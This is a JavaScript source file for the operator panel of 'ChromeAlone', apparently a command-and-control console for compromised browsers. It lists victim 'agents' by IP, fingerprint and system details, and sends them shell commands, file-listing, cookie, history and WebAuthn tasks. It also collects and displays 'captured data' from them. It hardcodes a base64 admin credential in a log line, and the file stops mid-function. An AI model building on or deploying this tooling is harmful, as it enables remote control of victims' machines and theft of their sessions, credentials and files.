class ChromeAloneAPI {
    constructor() {
        this.baseUrl = '';
        this.auth = '';
        this.eventSource = null;
        this.config = null; // Will be loaded from config.json
        this.taskHistory = this.loadTaskHistory();
        this.capturedDataHistory = this.loadCapturedDataHistory();
        this.currentBrowserPath = '';
        this.currentBrowserAgent = '';
        this.browserHistory = []; // For back/forward navigation
        this.agentAliases = this.loadAgentAliases(); // fingerprint -> alias mapping
        this.shellHistory = []; // Command history for shell tab
        this.shellHistoryIndex = -1; // Current position in history
        this.shellCurrentAgent = ''; // Currently selected shell agent
        this.initializeApplication();
    }

    initializeApplication() {
        this.loadConfig();
        this.initializeEventListeners();
        this.loadConfiguration();
        this.displayTaskHistory();
        this.displayCapturedData();
        this.updateCapturedDataFilters();
        this.updateUnreadCounter();
    }

    loadConfig() {
        // Load configuration from the global window.ChromeAloneConfig object
        if (window.ChromeAloneConfig) {
            this.config = window.ChromeAloneConfig;
            console.log('Configuration loaded from config.js:', this.config);
        } else {
            console.warn('window.ChromeAloneConfig not found, using fallback defaults');
        }
    }

    parseUserAgent(userAgent) {
        if (!userAgent) return { browser: 'Unknown', os: 'Unknown' };

        // Browser detection
        let browser = 'Unknown';
        if (userAgent.includes('Edg/')) {
            browser = 'Edge';
        } else if (userAgent.includes('Chrome/') && !userAgent.includes('Edg/')) {
            browser = 'Chrome';
        } else if (userAgent.includes('Firefox/')) {
            browser = 'Firefox';
        } else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome/')) {
            browser = 'Safari';
        } else if (userAgent.includes('OPR/') || userAgent.includes('Opera/')) {
            browser = 'Opera';
        }

        // OS detection
        let os = 'Unknown';
        if (userAgent.includes('Windows NT 10.0')) {
            os = 'Windows 10/11';
        } else if (userAgent.includes('Windows NT 6.3')) {
            os = 'Windows 8.1';
        } else if (userAgent.includes('Windows NT 6.2')) {
            os = 'Windows 8';
        } else if (userAgent.includes('Windows NT 6.1')) {
            os = 'Windows 7';
        } else if (userAgent.includes('Windows')) {
            os = 'Windows';
        } else if (userAgent.includes('Mac OS X')) {
            const match = userAgent.match(/Mac OS X (\d+)[._](\d+)/);
            if (match) {
                os = `macOS ${match[1]}.${match[2]}`;
            } else {
                os = 'macOS';
            }
        } else if (userAgent.includes('Linux')) {
            if (userAgent.includes('Android')) {
                os = 'Android';
            } else {
                os = 'Linux';
            }
        } else if (userAgent.includes('CrOS')) {
            os = 'Chrome OS';
        }

        return { browser, os };
    }

    initializeEventListeners() {
        document.getElementById('getAgents').addEventListener('click', () => this.getAgents());
        document.getElementById('executeCommand').addEventListener('click', () => this.executeCommand());
        document.getElementById('checkTask').addEventListener('click', () => this.checkTaskStatus());
        
        // Quick command buttons
        document.querySelectorAll('.quick-cmd').forEach(button => {
            button.addEventListener('click', (e) => this.executeQuickCommand(e));
        });
        
        // Command dropdown change handler
        document.getElementById('command').addEventListener('change', (e) => this.onCommandChange(e));
        
        // Tab navigation
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', (e) => this.switchTab(e.target.dataset.tab));
        });
        
        // Task history event listeners
        document.getElementById('clearTaskHistory').addEventListener('click', () => this.clearTaskHistory());
        document.getElementById('clearCapturedData').addEventListener('click', () => this.clearCapturedData());
        document.getElementById('historyFilter').addEventListener('change', () => this.displayTaskHistory());
        
        // Captured data event listeners  
        document.getElementById('capturedAgentFilter').addEventListener('change', () => this.displayCapturedData());
        document.getElementById('capturedContentFilter').addEventListener('input', () => this.displayCapturedData());
        document.getElementById('capturedTypeFilter').addEventListener('change', () => this.displayCapturedData());
        document.getElementById('markAllAsRead').addEventListener('click', () => this.markAllAsRead());
        
        // File browser event listeners
        document.getElementById('browserStart').addEventListener('click', () => this.startFileBrowser());
        document.getElementById('browserRefresh').addEventListener('click', () => this.refreshCurrentDirectory());
        document.getElementById('browserUpButton').addEventListener('click', () => this.navigateUp());
        
        // Interactive Shell event listeners
        document.getElementById('shellInput').addEventListener('keydown', (e) => this.handleShellInput(e));
        document.getElementById('shellAgentSelect').addEventListener('change', (e) => this.onShellAgentChange(e));
        document.getElementById('shellClear').addEventListener('click', () => this.clearShellTerminal());
        
        // Shell quick command buttons
        document.querySelectorAll('.shell-cmd').forEach(button => {
            button.addEventListener('click', (e) => this.executeShellQuickCommand(e));
        });
        
        // Auto-update configuration when inputs change
        ['serverHost', 'serverPort', 'username', 'password'].forEach(id => {
            document.getElementById(id).addEventListener('input', () => this.updateConfiguration());
        });
        
        // Auto-refresh agents using configured interval
        setInterval(() => this.getAgents(), this.config.ui.autoRefreshInterval);
        
        // Initial load
        setTimeout(() => this.getAgents(), 1000);
    }

    loadConfiguration() {
        document.getElementById('serverHost').value = this.config.server.defaultHost;
        document.getElementById('serverPort').value = this.config.server.defaultPort;
        document.getElementById('username').value = this.config.auth.defaultUsername;
        document.getElementById('password').value = this.config.auth.defaultPassword;
        
        // Set file browser default path
        document.getElementById('browserStartPath').value = this.config.fileBrowser.defaultStartPath;
        
        this.updateConfiguration();
    }

    updateConfiguration() {
        const host = document.getElementById('serverHost').value;
        const port = document.getElementById('serverPort').value;
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        this.baseUrl = `http://${host}:${port}`;
        // Create base64 encoded auth header the same way as the bash script
        const credentials = `${username}:${password}`;
        this.auth = btoa(credentials);

        // Save to localStorage
        localStorage.setItem('chromealone-config', JSON.stringify({
            host, port, username, password
        }));
        
        // Reconnect to SSE with new configuration
        this.connectSSE();
    }

    async makeRequest(endpoint, options = {}) {
        try {
            console.log('Making request to:', `${this.baseUrl}${endpoint}`);
            console.log('Auth header:', `Basic ${this.auth}`);
            console.log('Expected auth (bash equivalent):', 'Basic YWRtaW46d3BNdE5laU1sYTNvcnYxbkQ2MnhROVJqbjZCZS9IYUxlaFpIZVFQeWV2Yz0=');
            
            const headers = {
                'Authorization': `Basic ${this.auth}`,
                ...options.headers
            };
            
            // Only add Content-Type for POST requests
            if (options.method === 'POST') {
                headers['Content-Type'] = 'application/json';
            }
            
            const response = await fetch(`${this.baseUrl}${endpoint}`, {
                headers,
                ...options
            });

            console.log('Response status:', response.status);
            console.log('Response headers:', Object.fromEntries(response.headers.entries()));

            if (!response.ok) {
                const errorText = await response.text();
                console.error('Error response body:', errorText);
                throw new Error(`HTTP ${response.status}: ${response.statusText} - ${errorText}`);
            }

            return await response.json();
        } catch (error) {
            console.error('API Request failed:', error);
            throw error;
        }
    }

    showResponse(elementId, data, isError = false) {
        const element = document.getElementById(elementId);
        element.classList.remove('hidden');
        element.textContent = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
        
        if (isError) {
            element.style.backgroundColor = '#e74c3c';
        } else {
            element.style.backgroundColor = '#2c3e50';
        }
    }

    showMessage(text, isError = false) {
        const messageDiv = document.createElement('div');
        messageDiv.className = isError ? 'error' : 'success';
        messageDiv.textContent = text;
        
        document.querySelector('.content').insertBefore(messageDiv, document.querySelector('.section'));
        
        setTimeout(() => {
            messageDiv.remove();
        }, 5000);
    }


    async getAgents() {
        try {
            const data = await this.makeRequest('/info');
            this.displayAgents(data);
            this.updateAgentSelector(data);
        } catch (error) {
            const agentsList = document.getElementById('agentsList');
            agentsList.innerHTML = `<div class="error">Failed to load agents: ${error.message}</div>`;
        }
    }

    displayAgents(agents) {
        const agentsList = document.getElementById('agentsList');
        
        if (!agents || agents.length === 0) {
            agentsList.innerHTML = '<p>No agents connected.</p>';
            return;
        }

        const agentsHtml = agents.map(agent => {
            const displayName = this.getAgentDisplayName(agent.fingerprint);
            const hasAlias = this.agentAliases[agent.fingerprint];
            const fpShort = agent.fingerprint ? agent.fingerprint.substring(0, 16) + '...' : 'N/A';

            // Parse user agent to get browser and OS
            const uaInfo = this.parseUserAgent(agent.userAgent);
            const systemInfo = `${uaInfo.browser} on ${uaInfo.os}`;

            // Build additional info section
            const additionalInfo = hasAlias ?
                `<br><strong>IP Address:</strong> ${agent.ip || 'N/A'}<br><strong>Fingerprint:</strong> ${fpShort}` :
                `<br><strong>IP:</strong> ${agent.ip || 'N/A'}`;

            return `
                <div class="agent-card">
                    <div class="agent-header">
                        <div>
                            <span class="status-indicator ${agent.active ? 'status-online' : 'status-offline'}"></span>
                            <strong>${displayName}</strong>
                        </div>
                        <div>
                            <strong>Port:</strong> ${agent.port}
                        </div>
                    </div>
                    <div>
                        <strong>Status:</strong> ${agent.active ? 'Online' : 'Offline'}<br>
                        <strong>System:</strong> ${systemInfo}<br>
                        <strong>Platform:</strong> ${agent.platform || 'Unknown'}<br>
                        <strong>Connections:</strong> ${agent.connectionCount || 0}<br>
                        <strong>Last Seen:</strong> ${agent.lastSeen ? new Date(agent.lastSeen).toLocaleString() : 'Never'}${additionalInfo}
                    </div>
                    ${agent.userAgent ? `
                    <details style="margin-top: 10px;">
                        <summary style="cursor: pointer; color: #3498db;">View User Agent</summary>
                        <div style="margin-top: 5px; padding: 5px; background: #f8f9fa; border-radius: 4px; font-size: 11px; word-break: break-all;">
                            ${agent.userAgent}
                        </div>
                    </details>
                    ` : ''}
                    <div style="margin-top: 10px;">
                        <input type="text" id="alias-${agent.fingerprint}" placeholder="Enter alias..." value="${this.agentAliases[agent.fingerprint] || ''}" style="width: 150px; margin-right: 10px;">
                        <button onclick="window.chromeAloneAPI.renameAgent('${agent.fingerprint}')" style="padding: 4px 8px; font-size: 12px;">
                            ${hasAlias ? 'Rename' : 'Set Alias'}
                        </button>
                        ${hasAlias ? `<button onclick="window.chromeAloneAPI.clearAgentAlias('${agent.fingerprint}')" style="padding: 4px 8px; font-size: 12px; margin-left: 5px; background: #e74c3c;">Clear</button>` : ''}
                    </div>
                </div>
            `;
        }).join('');

        agentsList.innerHTML = agentsHtml;
    }

    updateAgentSelector(agents) {
        const selector = document.getElementById('targetIp');
        const currentValue = selector.value;

        selector.innerHTML = '<option value="">Select an agent...</option>';

        if (agents && agents.length > 0) {
            agents.forEach(agent => {
                const option = document.createElement('option');
                option.value = agent.fingerprint;
                const displayName = this.getAgentDisplayName(agent.fingerprint);
                option.textContent = `${displayName} (${agent.active ? 'Online' : 'Offline'})`;
                selector.appendChild(option);
            });
        }
        
        // Restore previous selection if still available
        if (currentValue) {
            selector.value = currentValue;
        }
        
        // Also update the history filter and browser agent selector with current agents
        this.updateHistoryFilter();
        this.updateBrowserAgentSelector(agents);
        this.updateShellAgentSelector(agents);
    }

    onCommandChange(event) {
        const command = event.target.value;
        const shellFields = document.getElementById('shellCommandFields');
        const genericField = document.getElementById('genericPayloadField');
        
        if (command === 'shell') {
            shellFields.classList.remove('hidden');
            genericField.classList.add('hidden');
        } else {
            shellFields.classList.add('hidden');
            genericField.classList.remove('hidden');
            
            // Set default payloads for different commands
            const payload = document.getElementById('payload');
            switch (command) {
                case 'ls':
                    payload.value = 'C:\\';
                    payload.placeholder = 'C:\\, D:\\, /home/user, etc.';
                    // Update label for ls command
                    document.querySelector('label[for="payload"]').textContent = 'Path:';
                    break;
                case 'cookies':
                case 'history':
                    payload.value = '{}';
                    payload.placeholder = '{}';
                    document.querySelector('label[for="payload"]').textContent = 'Payload (JSON String):';
                    break;
                case 'webauthn':
                    payload.value = '"{\\"domain\\": \\"example.com\\", \\"request\\": \\"eyJwdWJsaWNLZXkiOksic...\\"}"';
                    payload.placeholder = 'WebAuthn JSON payload';
                    document.querySelector('label[for="payload"]').textContent = 'Payload (JSON String):';
                    break;
                default:
                    payload.value = '{}';
                    payload.placeholder = 'JSON payload';
                    document.querySelector('label[for="payload"]').textContent = 'Payload (JSON String):';
            }
        }
    }

    async executeCommand() {
        try {
            const targetIp = document.getElementById('targetIp').value;
            const command = document.getElementById('command').value;

            if (!targetIp) {
                this.showMessage('Please select a target agent IP', true);
                return;
            }

            if (!command) {
                this.showMessage('Please select a command', true);
                return;
            }

            let payload;
            
            if (command === 'shell') {
                const shellCommand = document.getElementById('shellCommand').value;
                const shellArgs = document.getElementById('shellArgs').value;
                
                if (!shellCommand) {
                    this.showMessage('Please enter a shell command', true);
                    return;
                }
                
                // Concatenate command and args with | separator
                payload = `${shellCommand}|${shellArgs}`;
            } else {
                const payloadText = document.getElementById('payload').value;
                payload = payloadText.trim() || "{}";
            }

            const button = document.getElementById('executeCommand');
            const originalText = button.textContent;
            button.innerHTML = '<div class="loading"></div> Executing...';
            button.disabled = true;

            const data = await this.makeRequest('/command', {
                method: 'POST',
                body: JSON.stringify({
                    command,
                    payload,
                    fingerprint: targetIp
                })
            });

            this.showResponse('commandResponse', data);
            this.showMessage(`Command executed successfully! Task ID: ${data.taskId}`);
            
            // Auto-populate task ID field for tracking
            document.getElementById('taskId').value = data.taskId;
            
            // Add task to history
            this.addTaskToHistory({
                taskId: data.taskId,
                command: command,
                fingerprint: targetIp,
                payload: payload,
                status: 'pending'
            });

        } catch (error) {
            this.showResponse('commandResponse', `Error: ${error.message}`, true);
            this.showMessage(`Command execution failed: ${error.message}`, true);
        } finally {
            const button = document.getElementById('executeCommand');
            button.textContent = 'Execute Command';
            button.disabled = false;
        }
    }

    async checkTaskStatus() {
        try {
            const taskId = document.getElementById('taskId').value;

            if (!taskId) {
                this.showMessage('Please enter a task ID', true);
                return;
            }

            const button = document.getElementById('checkTask');
            const originalText = button.textContent;
            button.innerHTML = '<div class="loading"></div> Checking...';
            button.disabled = true;

            const data = await this.makeRequest(`/task/${taskId}`);
            this.showResponse('taskResponse', data);
            this.showMessage('Task status retrieved successfully!');

        } catch (error) {
            this.showResponse('taskResponse', `Error: ${error.message}`, true);
            this.showMessage(`Task status check failed: ${error.message}`, true);
        } finally {
            const button = document.getElementById('checkTask');
            button.textContent = 'Check Task Status';
            button.disabled = false;
        }
    }

    executeQuickCommand(event) {
        const button = event.target;
        const command = button.getAttribute('data-cmd');

        // Check if an agent is selected
        const targetIp = document.getElementById('targetIp').value;
        if (!targetIp) {
            this.showMessage('Please select a target agent first', true);
            return;
        }

        // Populate the form fields
        document.getElementById('command').value = command;
        
        // Trigger the command change event to show appropriate fields
        document.getElementById('command').dispatchEvent(new Event('change'));
        
        if (command === 'shell') {
            // For shell commands, populate the shell-specific fields
            const shellCmd = button.getAttribute('data-shellcmd');
            const shellArgs = button.getAttribute('data-shellargs');
            document.getElementById('shellCommand').value = shellCmd || '';
            document.getElementById('shellArgs').value = shellArgs || '';
        } else {
            // For other commands, populate the payload field
            const payload = button.getAttribute('data-payload');
            document.getElementById('payload').value = payload || '{}';
        }

        // Execute the command
        this.executeCommand();
    }

    connectSSE() {
        // Close existing connection
        if (this.eventSource) {
            this.eventSource.close();
        }

        if (!this.baseUrl || !this.auth) {
            document.getElementById('sseStatus').textContent = '⚠️ Configure server settings first';
            return;
        }

        try {
            // EventSource doesn't support custom headers, so pass auth as query parameter
            const eventsUrl = `${this.baseUrl}/events?auth=${encodeURIComponent(this.auth)}`;
            this.eventSource = new EventSource(eventsUrl);

            this.eventSource.onopen = () => {
                console.log('SSE connected');
                document.getElementById('sseStatus').textContent = '🔗 Connected to events';
                this.showMessage('🔗 Connected to real-time task events');
            };

            this.eventSource.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    this.handleSSEEvent(data);
                } catch (e) {
                    console.error('Error parsing SSE event:', e);
                }
            };

            this.eventSource.onerror = (error) => {
                console.error('SSE error:', error);
                if (this.eventSource.readyState === EventSource.CLOSED) {
                    // Check if it's an auth error (EventSource doesn't expose status codes directly)
                    document.getElementById('sseStatus').textContent = '❌ Connection failed';
                    this.showMessage('❌ Failed to connect to task events - check auth settings', true);
                    
                    // Don't auto-reconnect immediately for potential auth issues
                    setTimeout(() => {
                        if (this.auth && this.baseUrl) {
                            document.getElementById('sseStatus').textContent = '🔄 Reconnecting...';
                            this.connectSSE();
                        }
                    }, 10000); // Wait 10 seconds instead of 5 for potential auth issues
                }
            };
        } catch (error) {
            console.error('Failed to connect to SSE:', error);
        }
    }

    handleSSEEvent(data) {
        console.log('SSE Event:', data);

        switch (data.type) {
            case 'connected':
                console.log('SSE connection established');
                break;
            
            case 'task_queued':
                this.showMessage(`📋 Task ${data.taskId.substring(0, 8)}... queued for ${data.command} on ${data.fingerprint}`);
                break;
            
            case 'task_completed':
                console.log('Task completed SSE event:', data);
                this.showMessage(`✅ Task ${data.taskId.substring(0, 8)}... completed: ${data.command} on ${data.fingerprint}`);
                
                // Don't update task history for shell commands from Interactive Shell tab
                if (!(data.command === 'shell' && data.fingerprint === this.shellCurrentAgent)) {
                    // Update task history
                    this.updateTaskInHistory(data.taskId, {
                        status: 'completed',
                        result: data.result,
                        completedAt: new Date().toISOString()
                    });
                }
                
                // Check if this is a file browser ls command response
                if (data.command === 'ls' && this.pendingBrowserTask && this.pendingBrowserTask.taskId === data.taskId) {
                    this.handleLsResponse(data.taskId, data.result);
                }
                
                // Check if this is a shell command from the Interactive Shell tab
                if (data.command === 'shell' && data.fingerprint === this.shellCurrentAgent) {
                    console.log('Shell command response detected:', { 
                        taskId: data.taskId, 
                        fingerprint: data.fingerprint, 
                        shellCurrentAgent: this.shellCurrentAgent,
                        result: data.result 
                    });
                    this.handleShellResponse(data.taskId, data.result);
                }
                
                // If this is the task we're tracking, update the task response
                const currentTaskId = document.getElementById('taskId').value;
                if (currentTaskId === data.taskId) {
                    let displayResult = data.result;
                    
                    // Handle different result types
                    if (typeof data.result === 'string') {
                        if (data.command === 'shell') {
                            // Decode base64 for shell commands
                            try {
                                displayResult = atob(data.result);
                            } catch (e) {
                                console.warn('Failed to decode base64 result for shell command in task response:', e);
                                displayResult = `[Base64 decode failed] ${data.result}`;
                            }
                        } else if (data.command === 'ls') {
                            // Handle compressed file content in ls command results
                            displayResult = this.processLsResult(data.result);
                        }
                    }
                    
                    this.showResponse('taskResponse', {
                        taskId: data.taskId,
                        command: data.command,
                        fingerprint: data.fingerprint,
                        status: 'completed',
                        result: displayResult
                    });
                }
                break;
                
            case 'task_failed':
                console.log('Task failed SSE event:', data);
                this.showMessage(`❌ Task ${data.taskId.substring(0, 8)}... failed: ${data.command} on ${data.fingerprint}`, true);
                
                // Don't update task history for shell commands from Interactive Shell tab
                if (!(data.command === 'shell' && data.fingerprint === this.shellCurrentAgent)) {
                    // Update task history
                    this.updateTaskInHistory(data.taskId, {
                        status: 'failed',
                        result: data.error || data.result || 'Task failed',
                        completedAt: new Date().toISOString()
                    });
                }
                
                // Check if this is a shell command from the Interactive Shell tab
                if (data.command === 'shell' && data.fingerprint === this.shellCurrentAgent) {
                    console.log('Shell command failed:', { 
                        taskId: data.taskId, 
                        fingerprint: data.fingerprint, 
                        error: data.error || data.result
                    });
                    this.addShellOutput(`Error: ${data.error || data.result || 'Command failed'}`, 'shell-error');
                    this.addShellOutput(`[Command failed - Task ID: ${data.taskId}]`, 'shell-info');
                }
                break;
                
            case 'captured_data':
                this.showMessage(`📊 Data captured from ${data.fingerprint}: ${data.dataType || 'unknown type'}`);
                
                // Add captured data to history (similar to tasks but different format)
                this.addCapturedDataToHistory({
                    agentId: data.agentId,
                    fingerprint: data.fingerprint,
                    dataType: data.dataType,
                    data: data.data,
                    timestamp: data.timestamp
                });
                break;
                
            default:
                console.log('Unknown SSE event type:', data.type);
        }
    }

    // Task History Management
    loadTaskHistory() {
        try {
            const stored = localStorage.getItem('chromealone-task-history');
            return stored ? JSON.parse(stored) : [];
        } catch (e) {
            console.error('Error loading task history:', e);
            return [];
        }
    }

    loadCapturedDataHistory() {
        try {
            const stored = localStorage.getItem('chromealone-captured-data');
            const data = stored ? JSON.parse(stored) : [];
            
            // Migrate existing data to include read state and ID if missing
            return data.map(item => {
                if (!item.hasOwnProperty('isRead')) {
                    item.isRead = true; // Existing items are considered read
                }
                if (!item.id) {
                    item.id = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                }
                return item;
            });
        } catch (e) {
            console.error('Error loading captured data history:', e);
            return [];
        }
    }

    loadAgentAliases() {
        try {
            const stored = localStorage.getItem('chromealone-agent-aliases');
            return stored ? JSON.parse(stored) : {};
        } catch (e) {
            console.error('Error loading agent aliases:', e);
            return {};
        }
    }

    saveAgentAliases() {
        try {
            localStorage.setItem('chromealone-agent-aliases', JSON.stringify(this.agentAliases));
        } catch (e) {
            console.error('Error saving agent aliases:', e);
        }
    }

    setAgentAlias(ip, alias) {
        if (alias && alias.trim()) {
            this.agentAliases[ip] = alias.trim();
        } else {
            delete this.agentAliases[ip];
        }
        this.saveAgentAliases();
        
        // Refresh all displays that show agent information
        this.getAgents(); // This will trigger updates to all agent-related UI elements
    }

    getAgentDisplayName(ip, showIP = false) {
        const alias = this.agentAliases[ip];
        if (alias) {
            return showIP ? `${alias} (${ip})` : alias;
        }
        return ip;
    }

    getAgentIP(displayName) {
        // If displayName is an alias, return the corresponding IP
        for (const [ip, alias] of Object.entries(this.agentAliases)) {
            if (alias === displayName) {
                return ip;
            }
        }
        // If displayName is not an alias, assume it's an IP
        return displayName;
    }

    renameAgent(ip) {
        const input = document.getElementById(`alias-${ip}`);
        if (!input) return;
        
        const newAlias = input.value.trim();
        if (!newAlias) {
            this.showMessage('Please enter an alias name', true);
            return;
        }
        
        // Check if alias is already in use by another agent
        for (const [existingIp, existingAlias] of Object.entries(this.agentAliases)) {
            if (existingIp !== ip && existingAlias === newAlias) {
                this.showMessage('This alias is already in use by another agent', true);
                return;
            }
        }
        
        const oldAlias = this.agentAliases[ip];
        this.setAgentAlias(ip, newAlias);
        
        if (oldAlias) {
            this.showMessage(`Agent renamed from "${oldAlias}" to "${newAlias}"`);
        } else {
            this.showMessage(`Agent ${ip} aliased as "${newAlias}"`);
        }
    }

    clearAgentAlias(ip) {
        const alias = this.agentAliases[ip];
        if (alias) {
            if (confirm(`Remove alias "${alias}" for ${ip}?`)) {
                this.setAgentAlias(ip, '');
                this.showMessage(`Alias "${alias}" removed`);
            }
        }
    }

    saveTaskHistory() {
        try {
            localStorage.setItem('chromealone-task-history', JSON.stringify(this.taskHistory));
        } catch (e) {
            console.error('Error saving task history:', e);
        }
    }

    saveCapturedDataHistory() {
        try {
            localStorage.setItem('chromealone-captured-data', JSON.stringify(this.capturedDataHistory));
        } catch (e) {
            console.error('Error saving captured data history:', e);
        }
    }

    addTaskToHistory(taskData) {
        // Add timestamp if not present
        if (!taskData.timestamp) {
            taskData.timestamp = new Date().toISOString();
        }

        // Add to beginning of array (most recent first)
        this.taskHistory.unshift(taskData);

        // Keep only configured number of tasks to prevent localStorage from growing too large
        if (this.taskHistory.length > this.config.ui.taskHistoryLimit) {
            this.taskHistory = this.taskHistory.slice(0, this.config.ui.taskHistoryLimit);
        }

        this.saveTaskHistory();
        this.displayTaskHistory();
        this.updateHistoryFilter();
    }

    updateTaskInHistory(taskId, updates) {
        const taskIndex = this.taskHistory.findIndex(task => task.taskId === taskId);
        if (taskIndex !== -1) {
            this.taskHistory[taskIndex] = {
                ...this.taskHistory[taskIndex],
                ...updates
            };
            this.saveTaskHistory();
            this.displayTaskHistory();
        }
    }

    addCapturedDataToHistory(capturedData) {
        // Add read state and unique ID for new captured data
        capturedData.isRead = false;
        capturedData.id = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        
        // Add to beginning of array (most recent first)
        this.capturedDataHistory.unshift(capturedData);

        // Keep only configured number of entries to prevent localStorage from growing too large
        if (this.capturedDataHistory.length > this.config.ui.capturedDataLimit) {
            this.capturedDataHistory = this.capturedDataHistory.slice(0, this.config.ui.capturedDataLimit);
        }

        this.saveCapturedDataHistory();
        this.displayCapturedData(); // Update captured data display
        this.updateCapturedDataFilters();
        this.updateUnreadCounter();
    }

    clearTaskHistory() {
        if (confirm('Are you sure you want to clear task history?')) {
            this.taskHistory = [];
            this.saveTaskHistory();
            this.displayTaskHistory();
            this.updateHistoryFilter();
            this.showMessage('Task history cleared');
        }
    }

    clearCapturedData() {
        if (confirm('Are you sure you want to clear captured data?')) {
            this.capturedDataHistory = [];
            this.saveCapturedDataHistory();
            this.displayCapturedData();
            this.updateCapturedDataFilters();
            this.updateUnreadCounter();
            this.showMessage('Captured data cleared');
        }
    }

    switchTab(tabName) {
        // Remove active class from all tabs and content
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
        
        // Add active class to selected tab and content
        document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
        document.getElementById(`${tabName}-tab`).classList.add('active');
        
        // Update the appropriate display
        if (tabName === 'tasks') {
            this.displayTaskHistory();
        } else if (tabName === 'captured') {
            this.displayCapturedData();
            this.updateCapturedDataFilters();
        }
    }

    updateHistoryFilter() {
        const filter = document.getElementById('historyFilter');
        const currentValue = filter.value;
        
        // Get unique agent IPs from task history only
        const agentIPs = [...new Set(this.taskHistory.map(task => task.fingerprint))].sort();
        
        filter.innerHTML = '<option value="">All Agents</option>';
        agentIPs.forEach(ip => {
            const option = document.createElement('option');
            option.value = ip;
            const displayName = this.getAgentDisplayName(ip);
            option.textContent = displayName;
            filter.appendChild(option);
        });
        
        // Restore previous selection if still available
        if (currentValue && agentIPs.includes(currentValue)) {
            filter.value = currentValue;
        }
    }

    displayTaskHistory() {
        const historyContainer = document.getElementById('taskHistory');
        const filter = document.getElementById('historyFilter').value;
        
        // Filter task history only (no captured data)
        let filteredTasks = this.taskHistory;
        if (filter) {
            filteredTasks = this.taskHistory.filter(task => task.fingerprint === filter);
        }
        
        // Sort by timestamp (most recent first)
        filteredTasks.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        if (filteredTasks.length === 0) {
            historyContainer.innerHTML = '<div class="no-history">No task history available</div>';
            return;
        }

        const historyHtml = filteredTasks.map(task => {
            const timestamp = new Date(task.timestamp).toLocaleString();
            const statusClass = `status-${task.status || 'pending'}`;
            
            let resultHtml = '';
            if (task.result) {
                let resultText = typeof task.result === 'string' ? task.result : JSON.stringify(task.result, null, 2);
                
                // Handle different command types
                if (task.command === 'shell') {
                    // Decode base64 for shell commands
                    try {
                        resultText = atob(resultText);
                    } catch (e) {
                        console.warn('Failed to decode base64 result for shell command:', e);
                        resultText = `[Base64 decode failed] ${resultText}`;
                    }
                } else if (task.command === 'ls') {
                    // Handle compressed file content in ls command results
                    resultText = this.processLsResult(resultText);
                }
                
                resultHtml = `
                    <div style="margin-top: 10px;">
                        <strong>Result:</strong>
                        <div class="task-result">${this.escapeHtml(resultText)}</div>
                    </div>
                `;
            }

            return `
                <div class="task-history-item">
                    <div class="task-header">
                        <div>
                            <span class="task-id">${task.taskId}</span>
                            <span class="task-status ${statusClass}">${(task.status || 'pending').toUpperCase()}</span>
                        </div>
                        <div style="font-size: 12px; color: #7f8c8d;">
                            ${timestamp}
                        </div>
                    </div>
                    <div class="task-details">
                        <div><strong>Command:</strong> ${task.command}</div>
                        <div><strong>Agent:</strong> ${this.getAgentDisplayName(task.fingerprint, true)}</div>
                        <div><strong>Payload:</strong> ${this.escapeHtml(task.payload || 'N/A')}</div>
                    </div>
                    ${resultHtml}
                </div>
            `;
        }).join('');

        historyContainer.innerHTML = historyHtml;
    }

    displayCapturedData() {
        const capturedContainer = document.getElementById('capturedDataHistory');
        const agentFilter = document.getElementById('capturedAgentFilter').value;
        const contentFilter = document.getElementById('capturedContentFilter').value.toLowerCase();
        const typeFilter = document.getElementById('capturedTypeFilter').value;
        
        // Filter captured data
        let filteredData = this.capturedDataHistory;
        
        if (agentFilter) {
            filteredData = filteredData.filter(item => item.fingerprint === agentFilter);
        }
        
        if (contentFilter) {
            filteredData = filteredData.filter(item => {
                const dataText = typeof item.data === 'string' ? item.data : JSON.stringify(item.data);
                return dataText.toLowerCase().includes(contentFilter);
            });
        }
        
        if (typeFilter) {
            filteredData = filteredData.filter(item => item.dataType === typeFilter);
        }
        
        // Sort by timestamp (most recent first)
        filteredData.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        if (filteredData.length === 0) {
            capturedContainer.innerHTML = '<div class="no-history">No captured data available</div>';
            return;
        }

        const capturedHtml = filteredData.map(item => {
            const timestamp = new Date(item.timestamp).toLocaleString();
            const dataText = typeof item.data === 'string' ? item.data : JSON.stringify(item.data, null, 2);
            const isUnread = !item.isRead;
            const unreadClass = isUnread ? 'unread' : '';
            
            const markReadButton = isUnread ? 
                `<button class="mark-read-btn" onclick="window.chromeAloneAPI.markAsRead('${item.id}')">Mark as Read</button>` : 
                '';
            
            return `
                <div class="task-history-item captured-item ${unreadClass}">
                    <div class="task-header">
                        <div>
                            <span class="task-status status-completed">CAPTURED DATA</span>
                        </div>
                        <div style="font-size: 12px; color: #7f8c8d;">
                            ${timestamp}
                        </div>
                    </div>
                    <div class="task-details">
                        <div><strong>Data Type:</strong> ${item.dataType || 'Unknown'}</div>
                        <div><strong>Agent:</strong> ${this.getAgentDisplayName(item.fingerprint, true)}</div>
                        <div><strong>Agent ID:</strong> ${item.agentId}</div>
                    </div>
                    <div style="margin-top: 10px;">
                        <strong>Data:</strong>
                        <div class="task-result">${this.escapeHtml(dataText)}</div>
                        ${markReadButton}
                    </div>
                </div>
            `;
        }).join('');

        capturedContainer.innerHTML = capturedHtml;
    }

    updateCapturedDataFilters() {
        // Update agent filter for captured data
        const agentFilter = document.getElementById('capturedAgentFilter');
        const currentAgentValue = agentFilter.value;
        
        const agentIPs = [...new Set(this.capturedDataHistory.map(item => item.fingerprint))].sort();
        
        agentFilter.innerHTML = '<option value="">All Agents</option>';
        agentIPs.forEach(ip => {
            const option = document.createElement('option');
            option.value = ip;
            const displayName = this.getAgentDisplayName(ip);
            option.textContent = displayName;
            agentFilter.appendChild(option);
        });
        
        // Restore previous selection if still available
        if (currentAgentValue && agentIPs.includes(currentAgentValue)) {
            agentFilter.value = currentAgentValue;
        }
        
        // Update data type filter
        const typeFilter = document.getElementById('capturedTypeFilter');
        const currentTypeValue = typeFilter.value;
        
